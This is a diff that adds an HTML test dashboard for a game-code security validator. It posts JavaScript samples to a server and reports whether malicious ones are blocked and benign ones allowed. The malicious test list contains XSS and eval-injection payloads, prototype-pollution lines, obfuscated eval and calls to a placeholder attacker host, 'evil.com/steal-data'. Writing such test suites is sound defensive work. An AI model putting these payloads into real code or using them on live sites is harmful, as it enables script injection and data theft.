@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Validation Testing Dashboard</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 2.5em;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .header p {
+            margin: 10px 0 0 0;
+            opacity: 0.9;
+            font-size: 1.1em;
+        }
+        
+        .main-content {
+            padding: 30px;
+        }
+        
+        .test-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .test-panel {
+            border: 2px solid #e1e8ed;
+            border-radius: 10px;
+            padding: 20px;
+            background: #f8f9fa;
+        }
+        
+        .test-panel.malicious {
+            border-color: #ff6b6b;
+            background: linear-gradient(135deg, #ffe8e8, #fff0f0);
+        }
+        
+        .test-panel.benign {
+            border-color: #4ecdc4;
+            background: linear-gradient(135deg, #e8f8f8, #f0fffe);
+        }
+        
+        .test-panel h3 {
+            margin: 0 0 15px 0;
+            color: #2c3e50;
+            font-size: 1.3em;
+        }
+        
+        .malicious h3 {
+            color: #c0392b;
+        }
+        
+        .benign h3 {
+            color: #16a085;
+        }
+        
+        .test-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #4ecdc4, #44a08d);
+            color: white;
+        }
+        
+        .btn-info {
+            background: linear-gradient(135deg, #4facfe, #00f2fe);
+            color: white;
+        }
+        
+        .custom-test {
+            grid-column: 1 / -1;
+            background: linear-gradient(135deg, #ffeaa7, #fdcb6e);
+            border-color: #fdcb6e;
+        }
+        
+        .custom-test h3 {
+            color: #8b6914;
+        }
+        
+        textarea {
+            width: 100%;
+            height: 150px;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            resize: vertical;
+            background: white;
+        }
+        
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .checkbox-container {
+            margin: 15px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .checkbox-container input[type="checkbox"] {
+            transform: scale(1.2);
+        }
+        
+        .stats-panel {
+            background: linear-gradient(135deg, #e17055, #d63031);
+            color: white;
+            padding: 25px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .stats-panel h3 {
+            margin: 0 0 15px 0;
+            font-size: 1.4em;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        
+        .stat-item {
+            background: rgba(255,255,255,0.1);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 2em;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            opacity: 0.9;
+            font-size: 0.9em;
+        }
+        
+        .results-container {
+            max-height: 600px;
+            overflow-y: auto;
+            border: 2px solid #e1e8ed;
+            border-radius: 10px;
+            background: white;
+        }
+        
+        .result-item {
+            padding: 15px 20px;
+            border-bottom: 1px solid #e1e8ed;
+            margin: 0;
+        }
+        
+        .result-item:last-child {
+            border-bottom: none;
+        }
+        
+        .result-pass {
+            background: linear-gradient(90deg, #d4edda, #f8fff9);
+            border-left: 5px solid #28a745;
+        }
+        
+        .result-fail {
+            background: linear-gradient(90deg, #f8d7da, #fff5f5);
+            border-left: 5px solid #dc3545;
+        }
+        
+        .result-critical {
+            background: linear-gradient(90deg, #f5c6cb, #ffebee);
+            border-left: 5px solid #e91e63;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(233, 30, 99, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(233, 30, 99, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(233, 30, 99, 0); }
+        }
+        
+        .result-header {
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-bottom: 8px;
+        }
+        
+        .result-details {
+            color: #666;
+            font-size: 0.9em;
+            line-height: 1.4;
+        }
+        
+        .violation-list {
+            background: rgba(0,0,0,0.05);
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 8px;
+            font-family: monospace;
+            font-size: 0.85em;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+            font-style: italic;
+        }
+        
+        .loading::after {
+            content: '';
+            animation: dots 2s infinite;
+        }
+        
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: ''; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 Security Validation Test Suite</h1>
+            <p>Comprehensive testing for game code security validation system</p>
+        </div>
+        
+        <div class="main-content">
+            <div class="stats-panel" id="stats">
+                <h3>📊 Test Statistics</h3>
+                <div class="stats-grid" id="stats-content">
+                    <div class="stat-item">
+                        <div class="stat-value">-</div>
+                        <div class="stat-label">Total Tests</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">-</div>
+                        <div class="stat-label">Success Rate</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">-</div>
+                        <div class="stat-label">Malicious Blocked</div>
+                    </div>
+                    <div class="stat-item">
+                        <div class="stat-value">-</div>
+                        <div class="stat-label">Benign Allowed</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="test-buttons">
+                <button class="btn btn-primary" onclick="runAllTests()">🚀 Run All Tests</button>
+                <button class="btn btn-danger" onclick="runMaliciousTests()">🚨 Test Malicious Code</button>
+                <button class="btn btn-success" onclick="runBenignTests()">✅ Test Benign Code</button>
+                <button class="btn btn-info" onclick="runStressTests()">⚡ Stress Tests</button>
+            </div>
+            
+            <div class="test-grid">
+                <div class="test-panel malicious">
+                    <h3>🚨 Malicious Code Samples</h3>
+                    <p>These tests verify that dangerous code patterns are properly blocked by the security system.</p>
+                    <ul style="margin: 10px 0; padding-left: 20px; color: #666;">
+                        <li>Code injection attacks (eval, Function constructor)</li>
+                        <li>DOM manipulation (document.write, innerHTML)</li>
+                        <li>Prototype pollution attempts</li>
+                        <li>Global object access (window, location)</li>
+                        <li>Storage manipulation (localStorage, sessionStorage)</li>
+                        <li>Network requests (fetch, XMLHttpRequest)</li>
+                        <li>Obfuscation techniques</li>
+                    </ul>
+                </div>
+                
+                <div class="test-panel benign">
+                    <h3>✅ Benign Code Samples</h3>
+                    <p>These tests ensure that legitimate game development code is not incorrectly flagged.</p>
+                    <ul style="margin: 10px 0; padding-left: 20px; color: #666;">
+                        <li>Standard function declarations</li>
+                        <li>Phaser.js game setup code</li>
+                        <li>Safe timer usage (with functions)</li>
+                        <li>Mathematical operations</li>
+                        <li>Array and object manipulation</li>
+                        <li>Event handlers and callbacks</li>
+                    </ul>
+                </div>
+                
+                <div class="test-panel custom-test">
+                    <h3>🧪 Custom Code Testing</h3>
+                    <textarea id="customCode" placeholder="Enter JavaScript code to test security validation...
+
+Examples:
+- eval('alert(\"XSS\")')
+- new Function('return 42')()
+- setTimeout('console.log(\"test\")', 1000)
+- function safeFunction() { return 42; }"></textarea>
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="shouldFail">
+                        <label for="shouldFail">This code should be blocked by security validation</label>
+                    </div>
+                    <button class="btn btn-info" onclick="testCustomCode()">Test Custom Code</button>
+                </div>
+            </div>
+            
+            <div class="results-container" id="results">
+                <div class="loading">Ready to run security tests</div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="/static/js/security-tester.js"></script>
+    <script>
+        // Initialize security tester when page loads
+        let securityTester;
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Check if SecurityTester is available
+            if (typeof SecurityTester !== 'undefined') {
+                securityTester = new SecurityTester();
+                console.log('✅ Security tester initialized');
+            } else {
+                console.error('❌ SecurityTester not found - using server-side testing only');
+            }
+        });
+        
+        // Test execution functions
+        async function runAllTests() {
+            showLoading('Running comprehensive security test suite...');
+            
+            const results = [];
+            
+            // Run malicious tests
+            const maliciousResults = await runTestCategory('malicious');
+            results.push(...maliciousResults);
+            
+            // Run benign tests
+            const benignResults = await runTestCategory('benign');
+            results.push(...benignResults);
+            
+            // Run stress tests
+            const stressResults = await runTestCategory('stress');
+            results.push(...stressResults);
+            
+            displayResults(results);
+        }
+        
+        async function runMaliciousTests() {
+            showLoading('Testing malicious code patterns...');
+            const results = await runTestCategory('malicious');
+            displayResults(results);
+        }
+        
+        async function runBenignTests() {
+            showLoading('Testing benign code patterns...');
+            const results = await runTestCategory('benign');
+            displayResults(results);
+        }
+        
+        async function runStressTests() {
+            showLoading('Running stress tests...');
+            const results = await runTestCategory('stress');
+            displayResults(results);
+        }
+        
+        async function testCustomCode() {
+            const code = document.getElementById('customCode').value.trim();
+            const shouldFail = document.getElementById('shouldFail').checked;
+            
+            if (!code) {
+                alert('Please enter some code to test');
+                return;
+            }
+            
+            showLoading('Testing custom code...');
+            
+            const result = await testSingleCode(code, shouldFail, 'Custom Test');
+            displayResults([result]);
+        }
+        
+        async function runTestCategory(category) {
+            const testSets = {
+                malicious: getMaliciousTests(),
+                benign: getBenignTests(),
+                stress: getStressTests()
+            };
+            
+            const tests = testSets[category] || [];
+            const results = [];
+            
+            for (const test of tests) {
+                const result = await testSingleCode(test.code, test.shouldFail, test.name, test.category);
+                results.push(result);
+            }
+            
+            return results;
+        }
+        
+        async function testSingleCode(code, shouldFail, testName, category = 'Custom') {
+            try {
+                const response = await fetch('/security-test', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        code: code,
+                        test_name: testName
+                    })
+                });
+                
+                const result = await response.json();
+                
+                return {
+                    name: testName,
+                    category: category,
+                    shouldFail: shouldFail,
+                    actualResult: !result.is_safe,
+                    passed: shouldFail === !result.is_safe,
+                    violations: result.violations || [],
+                    warnings: result.warnings || [],
+                    details: result,
+                    code: code
+                };
+            } catch (error) {
+                return {
+                    name: testName,
+                    category: category,
+                    shouldFail: shouldFail,
+                    actualResult: true,
+                    passed: shouldFail,
+                    error: error.message,
+                    code: code
+                };
+            }
+        }
+        
+        function showLoading(message) {
+            document.getElementById('results').innerHTML = `<div class="loading">${message}</div>`;
+        }
+        
+        function displayResults(results) {
+            updateStats(results);
+            
+            let html = '';
+            const categories = [...new Set(results.map(r => r.category))];
+            
+            categories.forEach(category => {
+                const categoryResults = results.filter(r => r.category === category);
+                html += `<h4 style="padding: 15px 20px; margin: 0; background: #f8f9fa; border-bottom: 2px solid #dee2e6;">${category} Tests</h4>`;
+                
+                categoryResults.forEach(result => {
+                    const statusClass = result.passed ? 'result-pass' : 
+                                      (result.shouldFail && !result.actualResult ? 'result-critical' : 'result-fail');
+                    const statusIcon = result.passed ? '✅' : (result.shouldFail && !result.actualResult ? '🚨' : '❌');
+                    const statusText = result.passed ? 'PASS' : (result.shouldFail && !result.actualResult ? 'CRITICAL FAILURE' : 'FAIL');
+                    const expected = result.shouldFail ? 'BLOCK' : 'ALLOW';
+                    const actual = result.actualResult ? 'BLOCKED' : 'ALLOWED';
+                    
+                    html += `
+                        <div class="result-item ${statusClass}">
+                            <div class="result-header">
+                                ${statusIcon} ${statusText} - ${result.name}
+                            </div>
+                            <div class="result-details">
+                                <strong>Expected:</strong> ${expected} &nbsp;|&nbsp; <strong>Actual:</strong> ${actual}
+                                ${result.violations.length > 0 ? `
+                                    <div class="violation-list">
+                                        <strong>Security Violations:</strong><br>
+                                        ${result.violations.map(v => `• ${v}`).join('<br>')}
+                                    </div>
+                                ` : ''}
+                                ${result.warnings && result.warnings.length > 0 ? `
+                                    <div class="violation-list" style="background: #fff3cd;">
+                                        <strong>Warnings:</strong><br>
+                                        ${result.warnings.map(w => `• ${w}`).join('<br>')}
+                                    </div>
+                                ` : ''}
+                                ${result.error ? `<div style="color: #dc3545; margin-top: 8px;"><strong>Error:</strong> ${result.error}</div>` : ''}
+                            </div>
+                        </div>
+                    `;
+                });
+            });
+            
+            document.getElementById('results').innerHTML = html || '<div class="loading">No results to display</div>';
+        }
+        
+        function updateStats(results) {
+            const total = results.length;
+            const passed = results.filter(r => r.passed).length;
+            const maliciousTests = results.filter(r => r.shouldFail);
+            const benignTests = results.filter(r => !r.shouldFail);
+            const maliciousBlocked = maliciousTests.filter(r => r.actualResult).length;
+            const benignAllowed = benignTests.filter(r => !r.actualResult).length;
+            
+            const successRate = total > 0 ? (passed / total * 100).toFixed(1) : 0;
+            const maliciousRate = maliciousTests.length > 0 ? (maliciousBlocked / maliciousTests.length * 100).toFixed(1) : 0;
+            const benignRate = benignTests.length > 0 ? (benignAllowed / benignTests.length * 100).toFixed(1) : 0;
+            
+            document.getElementById('stats-content').innerHTML = `
+                <div class="stat-item">
+                    <div class="stat-value">${total}</div>
+                    <div class="stat-label">Total Tests</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">${successRate}%</div>
+                    <div class="stat-label">Success Rate</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">${maliciousRate}%</div>
+                    <div class="stat-label">Malicious Blocked</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">${benignRate}%</div>
+                    <div class="stat-label">Benign Allowed</div>
+                </div>
+            `;
+        }
+        
+        // Test data definitions
+        function getMaliciousTests() {
+            return [
+                // Code injection
+                {name: "Direct eval attack", code: 'eval("alert(\\"XSS\\")")', shouldFail: true, category: "Code Injection"},
+                {name: "Function constructor", code: 'new Function("alert(\\"XSS\\")")() ', shouldFail: true, category: "Code Injection"},
+                {name: "Indirect eval", code: 'window["eval"]("console.log(\\"bypassed\\")")', shouldFail: true, category: "Code Injection"},
+                {name: "Variable eval", code: 'var x = eval; x("alert(\\"attacked\\")")', shouldFail: true, category: "Code Injection"},
+                
+                // Timer injection
+                {name: "setTimeout string", code: 'setTimeout("alert(\\"XSS\\")", 1000)', shouldFail: true, category: "Timer Injection"},
+                {name: "setInterval string", code: 'setInterval("console.log(\\"evil\\")", 1000)', shouldFail: true, category: "Timer Injection"},
+                
+                // DOM manipulation
+                {name: "document.write", code: 'document.write("<script>alert(\\"XSS\\")</script>")', shouldFail: true, category: "DOM Manipulation"},
+                {name: "document.writeln", code: 'document.writeln("<img src=x onerror=alert(1)>")', shouldFail: true, category: "DOM Manipulation"},
+                {name: "innerHTML injection", code: 'document.body.innerHTML = "<script>alert(\\"XSS\\")</script>"', shouldFail: true, category: "DOM Manipulation"},
+                
+                // Prototype pollution
+                {name: "Object prototype", code: 'Object.prototype.isAdmin = true', shouldFail: true, category: "Prototype Pollution"},
+                {name: "__proto__ manipulation", code: 'var obj = {}; obj.__proto__.polluted = true', shouldFail: true, category: "Prototype Pollution"},
+                {name: "Constructor prototype", code: 'var x = {}; x.constructor.prototype.evil = function() { alert("pwned"); }', shouldFail: true, category: "Prototype Pollution"},
+                
+                // Global access
+                {name: "Window location", code: 'window.location = "http://evil.com"', shouldFail: true, category: "Global Access"},
+                {name: "Global this", code: '(function() { return this; })().alert("XSS")', shouldFail: true, category: "Global Access"},
+                
+                // Storage
+                {name: "localStorage", code: 'localStorage.setItem("evil", "payload")', shouldFail: true, category: "Storage Access"},
+                {name: "sessionStorage", code: 'sessionStorage.clear(); sessionStorage.setItem("hack", "data")', shouldFail: true, category: "Storage Access"},
+                
+                // Network
+                {name: "fetch request", code: 'fetch("http://evil.com/steal-data")', shouldFail: true, category: "Network Access"},
+                {name: "XMLHttpRequest", code: 'new XMLHttpRequest().open("GET", "http://evil.com")', shouldFail: true, category: "Network Access"},
+                
+                // Obfuscation
+                {name: "String concat obfuscation", code: 'var evil = "ev" + "al"; window[evil]("alert(\\"XSS\\")")', shouldFail: true, category: "Obfuscation"},
+                {name: "Unicode obfuscation", code: '\\u0065\\u0076\\u0061\\u006c("alert(\\"XSS\\")")', shouldFail: true, category: "Obfuscation"}
+            ];
+        }
+        
+        function getBenignTests() {
+            return [
+                {name: "Function declaration", code: 'function createPlayer() { return { x: 0, y: 0, health: 100 }; }', shouldFail: false, category: "Safe Functions"},
+                {name: "Arrow function", code: 'const movePlayer = (player, dx, dy) => { player.x += dx; player.y += dy; }', shouldFail: false, category: "Safe Functions"},
+                {name: "Phaser game setup", code: 'var config = { type: Phaser.AUTO, width: 800, height: 600 }; var game = new Phaser.Game(config);', shouldFail: false, category: "Safe Game Code"},
+                {name: "Safe setTimeout", code: 'setTimeout(function() { console.log("Safe timer"); }, 1000)', shouldFail: false, category: "Safe Timers"},
+                {name: "Safe setInterval", code: 'setInterval(() => { updateGame(); }, 16)', shouldFail: false, category: "Safe Timers"},
+                {name: "Object manipulation", code: 'var player = {}; player.health = 100; player.score = 0;', shouldFail: false, category: "Safe Objects"},
+                {name: "Array operations", code: 'var enemies = []; enemies.push({x: 100, y: 100}); enemies.forEach(e => e.update());', shouldFail: false, category: "Safe Objects"},
+                {name: "Math operations", code: 'var distance = Math.sqrt(Math.pow(dx, 2) + Math.pow(dy, 2));', shouldFail: false, category: "Safe Math"},
+                {name: "Conditional logic", code: 'if (player.health <= 0) { gameOver(); } else { continue(); }', shouldFail: false, category: "Safe Logic"}
+            ];
+        }
+        
+        function getStressTests() {
+            return [
+                {name: "Large code block", code: 'function test() {\n' + '  console.log("test");\n'.repeat(100) + '}', shouldFail: false, category: "Stress Test"},
+                {name: "Many string concatenations", code: 'var str = "a" + "b" + "c" + "d" + "e" + "f" + "g" + "h" + "i" + "j" + "k" + "l" + "m" + "n" + "o" + "p";', shouldFail: true, category: "Stress Test"},
+                {name: "Complex nested code", code: 'function complex() { var obj = { method: function() { return [1,2,3].map(x => x * 2); } }; return obj.method(); }', shouldFail: false, category: "Stress Test"},
+                {name: "High entropy string", code: 'var obfuscated = "aB3$kL9@mN2#pQ7!rS4%tU8&vW1*xY6^zC0+";', shouldFail: true, category: "Stress Test"}
+            ];
+        }
+    </script>
+</body>
+</html>
